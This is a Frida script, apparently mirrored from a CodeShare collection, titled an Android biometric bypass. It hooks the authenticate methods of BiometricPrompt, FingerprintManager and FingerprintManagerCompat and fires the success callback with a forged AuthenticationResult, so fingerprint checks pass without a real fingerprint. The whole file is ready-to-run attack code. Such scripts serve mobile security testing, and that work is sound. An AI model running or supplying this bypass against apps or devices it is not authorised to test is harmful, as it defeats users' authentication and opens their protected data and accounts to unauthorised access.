
//https://github.com/zengfr/frida-codeshare-scripts QQGroup: 143824179 .
//hash:-422916877 @GovindPalakkal/android-biometric-bypass-
Java.perform(function() {
    try {
        var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
        var authenticateMethod = BiometricPrompt.authenticate.overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');

        authenticateMethod.implementation = function(cancellationSignal, executor, callback) {
            console.log("[BiometricPrompt.authenticate()] - Original Arguments:");
            console.log("Cancellation Signal: " + cancellationSignal);
            console.log("Executor: " + executor);
            console.log("Callback: " + callback);

            var cryptoObject = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject').$new(null);
            var resultClass = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
            var resultInstance = resultClass.$new(cryptoObject);

            console.log("[BiometricPrompt.authenticate()] - Modified AuthenticationResult:");
            console.log("Modified CryptoObject: " + cryptoObject);
            console.log("Authentication Result: " + resultInstance);

            callback.onAuthenticationSucceeded(resultInstance);
            console.log("[BiometricPrompt.authenticate()] - Authentication Bypassed Successfully!");
        };
    } catch (error) {
        console.log("Error hooking BiometricPrompt.authenticate(): " + error);
    }

    try {
        var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
        var fingerprintAuthenticateMethod = FingerprintManager.authenticate.overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler');

        fingerprintAuthenticateMethod.implementation = function(crypto, cancellationSignal, flags, callback, handler) {
            console.log("[FingerprintManager.authenticate()] - Original Arguments:");
            console.log("Crypto: " + crypto);
            console.log("Cancellation Signal: " + cancellationSignal);
            console.log("Flags: " + flags);
            console.log("Callback: " + callback);
            console.log("Handler: " + handler);

            var cryptoObject = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject').$new(null);
            var resultClass = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
            var resultInstance = resultClass.$new(cryptoObject);

            console.log("[FingerprintManager.authenticate()] - Modified AuthenticationResult:");
            console.log("Modified CryptoObject: " + cryptoObject);
            console.log("Authentication Result: " + resultInstance);

            callback.onAuthenticationSucceeded(resultInstance);
            console.log("[FingerprintManager.authenticate()] - Authentication Bypassed Successfully!");
        };
    } catch (error) {
        console.log("Error hooking FingerprintManager.authenticate(): " + error);
    }

    try {
        var FingerprintManagerCompat = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat');
        var fingerprintCompatAuthenticateMethod = FingerprintManagerCompat.authenticate.overload('androidx.core.hardware.fingerprint.FingerprintManagerCompat$CryptoObject', 'int', 'android.os.CancellationSignal', 'androidx.core.hardware.fingerprint.FingerprintManagerCompat$AuthenticationCallback', 'android.os.Handler');

        fingerprintCompatAuthenticateMethod.implementation = function(crypto, flags, cancellationSignal, callback, handler) {
            console.log("[FingerprintManagerCompat.authenticate()] - Original Arguments:");
            console.log("Crypto: " + crypto);
            console.log("Flags: " + flags);
            console.log("Cancellation Signal: " + cancellationSignal);
            console.log("Callback: " + callback);
            console.log("Handler: " + handler);

            var cryptoObject = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$CryptoObject').$new(null);
            var resultClass = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
            var resultInstance = resultClass.$new(cryptoObject);

            console.log("[FingerprintManagerCompat.authenticate()] - Modified AuthenticationResult:");
            console.log("Modified CryptoObject: " + cryptoObject);
            console.log("Authentication Result: " + resultInstance);

            callback.onAuthenticationSucceeded(resultInstance);
            console.log("[FingerprintManagerCompat.authenticate()] - Authentication Bypassed Successfully!");
        };
    } catch (error) {
        console.log("Error hooking FingerprintManagerCompat.authenticate(): " + error);
    }
});
//https://github.com/zengfr/frida-codeshare-scripts QQGroup: 143824179 .
//hash:-422916877 @GovindPalakkal/android-biometric-bypass-
